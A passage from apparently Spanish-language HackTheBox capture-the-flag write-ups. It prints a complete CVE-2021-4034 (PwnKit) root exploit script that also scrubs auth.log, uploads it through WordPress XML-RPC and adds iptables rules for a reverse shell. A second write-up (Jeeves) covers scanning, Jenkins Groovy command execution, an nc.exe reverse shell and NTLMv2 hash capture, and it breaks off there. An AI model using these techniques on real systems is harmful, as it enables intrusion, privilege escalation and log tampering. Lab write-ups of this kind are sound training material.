<span class="nb">echo</span> <span class="s2">"‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó ‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ïó‚ñà‚ñà‚ïó    ‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ïó   ‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó "</span>
<span class="nb">echo</span> <span class="s2">"‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë ‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ïë    ‚ñà‚ñà‚ïë‚ñà‚ñà‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïê‚ïù‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó"</span>
<span class="nb">echo</span> <span class="s2">"‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù ‚ñà‚ñà‚ïë ‚ñà‚ïó ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ñà‚ñà‚ïó ‚ñà‚ñà‚ïë‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù"</span>
<span class="nb">echo</span> <span class="s2">"‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïù ‚ñà‚ñà‚ïî‚ïê‚ñà‚ñà‚ïó ‚ñà‚ñà‚ïë‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë‚ïö‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ïê‚ïê‚ïù  ‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó"</span>
<span class="nb">echo</span> <span class="s2">"‚ñà‚ñà‚ïë     ‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïó‚ïö‚ñà‚ñà‚ñà‚ïî‚ñà‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ïë ‚ïö‚ñà‚ñà‚ñà‚ñà‚ïë‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë"</span>
<span class="nb">echo</span> <span class="s2">"‚ïö‚ïê‚ïù     ‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïù ‚ïö‚ïê‚ïê‚ïù‚ïö‚ïê‚ïê‚ïù ‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïê‚ïê‚ïù‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïù"</span>
<span class="nb">echo</span> <span class="s2">"CVE-2021-4034 PoC by Kim Schulz"</span>
<span class="c"># shell poc by Kim Schulz</span>
<span class="nb">echo</span> <span class="s2">"[+] Setting up environment..."</span>
<span class="nb">mkdir</span> <span class="nt">-p</span> <span class="s1">'GCONV_PATH=.'</span>
<span class="nb">touch</span> <span class="s1">'GCONV_PATH=./pkwner'</span>
<span class="nb">chmod </span>a+x <span class="s1">'GCONV_PATH=./pkwner'</span>
<span class="nb">mkdir</span> <span class="nt">-p</span> pkwner
<span class="nb">echo</span> <span class="s2">"module UTF-8// PKWNER// pkwner 2"</span> <span class="o">&gt;</span> pkwner/gconv-modules
<span class="nb">cat</span> <span class="o">&gt;</span> pkwner/pkwner.c <span class="o">&lt;&lt;-</span> <span class="no">EOM</span><span class="sh">
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
void gconv() {}
void gconv_init() {
  printf("hello");
  setuid(0); setgid(0);
	seteuid(0); setegid(0);
  system("PATH=/bin:/usr/bin:/usr/sbin:/usr/local/bin/:/usr/local/sbin;"
         "rm -rf 'GCONV_PATH=.' 'pkwner';"
         "cat /var/log/auth.log|grep -v pkwner &gt;/tmp/al;cat /tmp/al &gt;/var/log/auth.log;"
         "cat /root/root.txt");
	exit(0);
}
</span><span class="no">EOM

</span><span class="nb">cat</span> <span class="o">&gt;</span> pkwner/exec.c <span class="o">&lt;&lt;-</span> <span class="no">EOM</span><span class="sh">
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
int main(){
  char *env[] = {"pkwner", "PATH=GCONV_PATH=.", "CHARSET=PKWNER",
                 "SHELL=pkwner", NULL};
  execve("/usr/bin/pkexec", (char *[]){NULL}, env);
}
</span><span class="no">EOM
</span><span class="nb">echo</span> <span class="s2">"[+] Build offensive gconv shared module..."</span>
gcc <span class="nt">-fPIC</span> <span class="nt">-shared</span> <span class="nt">-o</span> pkwner/pkwner.so pkwner/pkwner.c
<span class="nb">echo</span> <span class="s2">"[+] Build mini executor..."</span>
gcc <span class="nt">-o</span> pkwner/executor pkwner/exec.c
<span class="c"># export PATH="GCONV_PATH=."</span>
<span class="c"># export CHARSET="PKWNER"</span>
<span class="c">#export SHELL=pkwner</span>
<span class="nv">PATH</span><span class="o">=</span><span class="s1">'GCONV_PATH=.'</span> ./pkwner/executor
<span class="nb">echo</span> <span class="s2">"[+] Nice Job"</span>
</code></pre></div></div>

<ul>
  <li>Volvemos hacer todo el proceso en python3 y al final ejecutamos lo siguiente.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> data_upload <span class="o">=</span> <span class="o">{</span> <span class="s1">'name'</span>: <span class="s1">'new.png'</span>, <span class="s1">'bits'</span>: filename, <span class="s1">'type'</span>: <span class="s1">'text/plain'</span><span class="o">}</span>
<span class="o">&gt;&gt;&gt;</span> client.call<span class="o">(</span>media.UploadFile<span class="o">(</span>data_upload<span class="o">))</span>
<span class="o">{</span><span class="s1">'attachment_id'</span>: <span class="s1">'57'</span>, <span class="s1">'date_created_gmt'</span>: &lt;DateTime <span class="s1">'20240625T02:22:16'</span> at 0x7fd3870a7750&gt;, <span class="s1">'parent'</span>: 0, <span class="s1">'link'</span>: <span class="s1">'/wp-content/uploads/2024/06/new.png'</span>, <span class="s1">'title'</span>: <span class="s1">'new.png'</span>, <span class="s1">'caption'</span>: <span class="s1">''</span>, <span class="s1">'description'</span>: <span class="s1">''</span>, <span class="s1">'metadata'</span>: False, <span class="s1">'type'</span>: <span class="s1">'text/plain'</span>, <span class="s1">'thumbnail'</span>: <span class="s1">'/wp-content/uploads/2024/06/new.png'</span>, <span class="s1">'id'</span>: <span class="s1">'57'</span>, <span class="s1">'file'</span>: <span class="s1">'new.png'</span>, <span class="s1">'url'</span>: <span class="s1">'/wp-content/uploads/2024/06/new.png'</span><span class="o">}</span>
</code></pre></div></div>

<ul>
  <li>Vamos a ver la flag.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  content ./script.sh
<span class="nv">$~</span>  bash /var/www/html/wp-content/uploads/2024/06/new.png
‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó ‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ïó‚ñà‚ñà‚ïó    ‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ïó   ‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó
‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë ‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ïë    ‚ñà‚ñà‚ïë‚ñà‚ñà‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïê‚ïù‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó
‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù ‚ñà‚ñà‚ïë ‚ñà‚ïó ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ñà‚ñà‚ïó ‚ñà‚ñà‚ïë‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù
‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïù ‚ñà‚ñà‚ïî‚ïê‚ñà‚ñà‚ïó ‚ñà‚ñà‚ïë‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë‚ïö‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ïê‚ïê‚ïù  ‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó
‚ñà‚ñà‚ïë     ‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïó‚ïö‚ñà‚ñà‚ñà‚ïî‚ñà‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ïë ‚ïö‚ñà‚ñà‚ñà‚ñà‚ïë‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë
‚ïö‚ïê‚ïù     ‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïù ‚ïö‚ïê‚ïê‚ïù‚ïö‚ïê‚ïê‚ïù ‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïê‚ïê‚ïù‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïù
CVE-2021-4034 PoC by Kim Schulz
<span class="o">[</span>+] Setting up environment...
<span class="o">[</span>+] Build offensive gconv shared module...
<span class="o">[</span>+] Build mini executor...
10b224d4bc6cab7b7fbd9f4deb10b9eb
hello[+] Nice Job
</code></pre></div></div>

<blockquote>
  <p>Para ganar <code class="language-plaintext highlighter-rouge">shell</code> hay que ejecutar 2 comandos de <code class="language-plaintext highlighter-rouge">IPTables</code> para que acepte trafico de nuestra IP y poder entablar la reverse <code class="language-plaintext highlighter-rouge">shell</code>.</p>
</blockquote>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>iptables <span class="nt">-A</span> OUTPUT <span class="nt">-p</span> tcp <span class="nt">-d</span> 10.10.14.63 <span class="nt">-j</span> ACCEPT
iptables <span class="nt">-A</span> INPUT <span class="nt">-p</span> tcp <span class="nt">-s</span> 10.10.14.63 <span class="nt">-j</span> ACCEPT
</code></pre></div></div>]]></content><author><name>MiguelRega7</name></author><category term="hackthebox/machines/hard" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HackTheBox - Jeeves (medium)</title><link href="http://localhost:4000/hackthebox/machines/medium/2024/06/22/jeeves.html" rel="alternate" type="text/html" title="HackTheBox - Jeeves (medium)" /><published>2024-06-22T00:00:00-06:00</published><updated>2024-06-22T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/machines/medium/2024/06/22/jeeves</id><content type="html" xml:base="http://localhost:4000/hackthebox/machines/medium/2024/06/22/jeeves.html"><![CDATA[<p align="center">
<img src="https://labs.hackthebox.com/storage/avatars/709059a710d3d6ff1ba32bf0729ecbb8.png" />
</p>

<ul>
  <li>Jeeves is not overly complicated, however it focuses on some interesting techniques and provides a great learning experience. As the use of alternate data streams is not very common, some users may have a hard time locating the correct escalation path.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ ping <span class="nt">-c</span> 1 10.10.10.63
PING 10.10.10.63 <span class="o">(</span>10.10.10.63<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
64 bytes from 10.10.10.63: <span class="nv">icmp_seq</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>127 <span class="nb">time</span><span class="o">=</span>97.5 ms

<span class="nt">---</span> 10.10.10.63 ping statistics <span class="nt">---</span>
1 packets transmitted, 1 received, 0% packet loss, <span class="nb">time </span>0ms
rtt min/avg/max/mdev <span class="o">=</span> 97.478/97.478/97.478/0.000 ms
‚ùØ whichSystem.py 10.10.10.63

10.10.10.63 <span class="o">(</span>ttl -&gt; 127<span class="o">)</span>: Windows
</code></pre></div></div>

<h2 id="portscan">PortScan</h2>

<ul>
  <li><a href="https://github.com/MikeRega7/nrunscan">nrunscan</a> esta es la herramienta que hice que te automatiza el escaneo de <code class="language-plaintext highlighter-rouge">nmap</code> por <strong>TCP</strong> por si quieres usarla.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ nmap <span class="nt">-sCV</span> <span class="nt">-p80</span>,135,445,50000 10.10.10.63 <span class="nt">-oN</span> targeted
Starting Nmap 7.93 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-07-02 17:38 CST
Nmap scan report <span class="k">for </span>10.10.10.63
Host is up <span class="o">(</span>0.096s latency<span class="o">)</span><span class="nb">.</span>

PORT      STATE    SERVICE      VERSION
80/tcp    open     http         Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: Ask Jeeves
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open     msrpc        Microsoft Windows RPC
445/tcp   open     microsoft-ds Microsoft Windows 7 - 10 microsoft-ds <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
50000/tcp filtered ibm-db2
Service Info: Host: JEEVES<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled <span class="o">(</span>dangerous, but default<span class="o">)</span>
| smb2-time:
|   <span class="nb">date</span>: 2023-07-03T04:39:17
|_  start_date: 2023-07-03T03:49:32
|_clock-skew: mean: 4h59m59s, deviation: 0s, median: 4h59m58s
| smb2-security-mode:
|   311:
|_    Message signing enabled but not required
</code></pre></div></div>

<h2 id="enumeraci√≥n">Enumeraci√≥n</h2>

<ul>
  <li>Bueno, el <code class="language-plaintext highlighter-rouge">crackmapexec</code> nos reporta que estamos ante un <strong>Windows 10 Pro</strong>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ crackmapexec smb 10.10.10.63
SMB         10.10.10.63     445    JEEVES           <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 Pro 10586 x64 <span class="o">(</span>name:JEEVES<span class="o">)</span> <span class="o">(</span>domain:Jeeves<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Vamos a comenzar enumerando por <code class="language-plaintext highlighter-rouge">smb</code> para ver si encontramos recursos compartidos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ smbclient <span class="nt">-L</span> 10.10.10.63 <span class="nt">-N</span>
session setup failed: NT_STATUS_ACCESS_DENIED
</code></pre></div></div>

<ul>
  <li>Si comprobamos usando otras herramientas, vemos que no podemos enumerar por este puerto, ya que no tenemos credenciales y no podemos emplear un <strong>Null Session</strong>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ smbmap <span class="nt">-H</span> 10.10.10.63
<span class="o">[!]</span> Authentication error on 10.10.10.63
</code></pre></div></div>

<ul>
  <li>Vamos a ver las tecnolog√≠as que est√°n corriendo en los puertos que tienen un servicio <code class="language-plaintext highlighter-rouge">http</code>.</li>
</ul>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">‚ùØ</span> <span class="n">whatweb</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.63</span>
<span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.63</span> <span class="p">[</span><span class="mi">200</span> <span class="no">OK</span><span class="p">]</span> <span class="no">Country</span><span class="p">[</span><span class="no">RESERVED</span><span class="p">][</span><span class="no">ZZ</span><span class="p">],</span> <span class="no">HTML5</span><span class="p">,</span> <span class="no">HTTPServer</span><span class="p">[</span><span class="no">Microsoft</span><span class="o">-</span><span class="no">IIS</span><span class="o">/</span><span class="mf">10.0</span><span class="p">],</span> <span class="no">IP</span><span class="p">[</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.63</span><span class="p">],</span> <span class="no">Microsoft</span><span class="o">-</span><span class="no">IIS</span><span class="p">[</span><span class="mf">10.0</span><span class="p">],</span> <span class="no">Title</span><span class="p">[</span><span class="no">Ask</span> <span class="no">Jeeves</span><span class="p">]</span>
</code></pre></div></div>

<ul>
  <li>Pues bueno, vamos a ver la p√°gina web.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/jeeves/web1.png" />
</p>

<ul>
  <li>Bueno es la primera vez que veo eso si investigamos vemos que es un <strong>buscador</strong>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/jeeves/web2.png" />
</p>

<ul>
  <li>Bueno si investigamos de primeras si tiene vulnerabilidades como tal solo vemos una, pero no creo que este sea el caso, ya que esta m√°quina no contempla <strong>buffer overflow</strong>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ searchsploit jeeves
<span class="nt">----------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
 Exploit Title                                                                                |  Path
<span class="nt">----------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
Ask.com/AskJeeves Toolbar Toolbar 4.0.2.53 - ActiveX Remote Buffer Overflow                   | windows/remote/4452.html
<span class="nt">----------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
Shellcodes: No Results
</code></pre></div></div>

<ul>
  <li>Vamos a buscar algo en el navegador para probarlo.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/jeeves/web3.png" />
</p>

<ul>
  <li>Pero bueno nos redirige a <code class="language-plaintext highlighter-rouge">error.html?</code> y bueno ya nos est√°n dando informaci√≥n sobre el error.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/jeeves/web4.png" />
</p>

<ul>
  <li>Vamos a comenzar aplicando <strong>Fuzzing</strong> para ver si encontramos m√°s rutas de la m√°quina.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ feroxbuster <span class="nt">-t</span> 200 <span class="nt">-x</span> php,txt,html <span class="nt">-u</span> http://10.10.10.63

 ___  ___  __   __     __      __         __   ___
|__  |__  |__<span class="o">)</span> |__<span class="o">)</span> | /  <span class="sb">`</span>    /  <span class="se">\ \_</span>/ | |  <span class="se">\ </span>|__
|    |___ |  <span class="se">\ </span>|  <span class="se">\ </span>| <span class="se">\_</span>_,    <span class="se">\_</span>_/ / <span class="se">\ </span>| |__/ |___
by Ben <span class="s2">"epi"</span> Risher ü§ì                 ver: 2.3.3
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
 üéØ  Target Url            ‚îÇ http://10.10.10.63
 üöÄ  Threads               ‚îÇ 200
 üìñ  Wordlist              ‚îÇ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 üëå  Status Codes          ‚îÇ <span class="o">[</span>200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 üí•  Timeout <span class="o">(</span>secs<span class="o">)</span>        ‚îÇ 7
 ü¶°  User-Agent            ‚îÇ feroxbuster/2.3.3
 üíâ  Config File           ‚îÇ /etc/feroxbuster/ferox-config.toml
 üí≤  Extensions            ‚îÇ <span class="o">[</span>php, txt, html]
 üîÉ  Recursion Depth       ‚îÇ 4
 üéâ  New Version Available ‚îÇ https://github.com/epi052/feroxbuster/releases/latest
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
 üèÅ  Press <span class="o">[</span>ENTER] to use the Scan Cancel Menu‚Ñ¢
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
200        1l        4w       50c http://10.10.10.63/error.html
200       17l       40w      503c http://10.10.10.63/index.html
200        1l        4w       50c http://10.10.10.63/Error.html
200       17l       40w      503c http://10.10.10.63/Index.html
<span class="o">[</span><span class="c">####################] - 1m    119996/119996  0s      found:4       errors:0</span>
<span class="o">[</span><span class="c">####################] - 1m    119996/119996  1741/s  http://10.10.10.63</span>
</code></pre></div></div>

<h2 id="enumeraci√≥n-50000">Enumeraci√≥n 50000</h2>

<ul>
  <li>
    <p>Bueno si analizamos el escaneo de <code class="language-plaintext highlighter-rouge">nmap</code> vemos que tambi√©n est√° el puerto <code class="language-plaintext highlighter-rouge">50000</code> vamos a ver que hay, ya que nos dicen <strong>Service Info</strong>.</p>
  </li>
  <li>
    <p>Volv√≠ a escanear el puerto y si est√° abierto.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ nmap <span class="nt">-sCV</span> <span class="nt">-p50000</span> 10.10.10.63 <span class="nt">-oN</span> targe2
Starting Nmap 7.93 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-07-02 18:03 CST
Nmap scan report <span class="k">for </span>10.10.10.63
Host is up <span class="o">(</span>0.093s latency<span class="o">)</span><span class="nb">.</span>

PORT      STATE SERVICE VERSION
50000/tcp open  http    Jetty 9.4.z-SNAPSHOT
|_http-title: Error 404 Not Found
|_http-server-header: Jetty<span class="o">(</span>9.4.z-SNAPSHOT<span class="o">)</span>

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>25.07 seconds
</code></pre></div></div>

<ul>
  <li>Esto es lo que hay.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/jeeves/web5.png" />
</p>

<ul>
  <li>Pero no encontramos nada vamos a aplicar <strong>Fuzzing</strong> pero ahora para este puerto.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://10.10.10.63:50000 <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt <span class="nt">-t</span> 50 <span class="nt">-x</span> txt,php,html <span class="nt">--no-error</span>
<span class="o">===============================================================</span>
Gobuster v3.1.0
by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
<span class="o">===============================================================</span>
<span class="o">[</span>+] Url:                     http://10.10.10.63:50000
<span class="o">[</span>+] Method:                  GET
<span class="o">[</span>+] Threads:                 50
<span class="o">[</span>+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
<span class="o">[</span>+] Negative Status codes:   404
<span class="o">[</span>+] User Agent:              gobuster/3.1.0
<span class="o">[</span>+] Extensions:              txt,php,html
<span class="o">[</span>+] Timeout:                 10s
<span class="o">===============================================================</span>
2023/07/02 18:07:16 Starting gobuster <span class="k">in </span>directory enumeration mode
<span class="o">===============================================================</span>
/askjeeves            <span class="o">(</span>Status: 302<span class="o">)</span> <span class="o">[</span>Size: 0] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.10.63:50000/askjeeves/]
</code></pre></div></div>

<ul>
  <li>Y bueno nos redirige a un <strong>Jenkins</strong>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/jeeves/web6.png" />
</p>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/jeeves/web7.png" />
</p>

<ul>
  <li>Bueno vemos que esto est√° activado.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/jeeves/web8.png" />
</p>

<ul>
  <li>Bueno vemos que podemos ejecutar comandos en <strong>Groovy</strong>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/jeeves/web9.png" />
</p>

<ul>
  <li>Si buscamos como podemos ejecutar alg√∫n comando encontramos lo siguiente.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/jeeves/web10.png" />
</p>

<ul>
  <li>Vamos a probarlo.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/jeeves/web11.png" />
</p>

<ul>
  <li>Y bueno funciona.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/jeeves/web12.png" />
</p>

<ul>
  <li>Bueno ahora lo que podemos hacer es asegurarnos de que si ganamos acceso al sistema ganar acceso ala m√°quina real y no a un contenedor para eso vamos a ejecutar el siguiente comando.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/jeeves/web13.png" />
</p>

<h2 id="shell-as-kohsuke">Shell as kohsuke</h2>

<ul>
  <li>Bueno para ganar acceso vamos a necesitar <code class="language-plaintext highlighter-rouge">nc.exe</code> si tienes <code class="language-plaintext highlighter-rouge">seclists</code> clonado o instalado ya te viene el <code class="language-plaintext highlighter-rouge">nc.exe</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ locate nc.exe
/usr/share/seclists/Web-Shells/FuzzDB/nc.exe
‚ùØ <span class="nb">cp</span> /usr/share/seclists/Web-Shells/FuzzDB/nc.exe <span class="nb">.</span>
</code></pre></div></div>

<ul>
  <li>Vamos a usar <code class="language-plaintext highlighter-rouge">smbserver.py</code> o <code class="language-plaintext highlighter-rouge">impacket-smbserver</code> para ofrecer el <code class="language-plaintext highlighter-rouge">nc.exe</code> es importante que lo ejecutes en la ruta donde se encuentre el <strong>nc.exe</strong>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ smbserver.py parrotsec <span class="nb">.</span> <span class="nt">-smb2support</span>
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
</code></pre></div></div>

<ul>
  <li>Vamos a ponernos en escucha para directamente enviarnos una <code class="language-plaintext highlighter-rouge">reverse shell</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ rlwrap nc <span class="nt">-lvnp</span> 443
Listening on 0.0.0.0 443
</code></pre></div></div>

<ul>
  <li>Y bueno vamos a escapar las barras para que no entre en conflicto vamos a darle a <strong>Execute</strong>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/jeeves/web14.png" />
</p>

<ul>
  <li>Y ganamos acceso adem√°s tenemos un <strong>Hash</strong> <code class="language-plaintext highlighter-rouge">NTLMV2</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ smbserver.py parrotsec <span class="nb">.</span> <span class="nt">-smb2support</span>
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
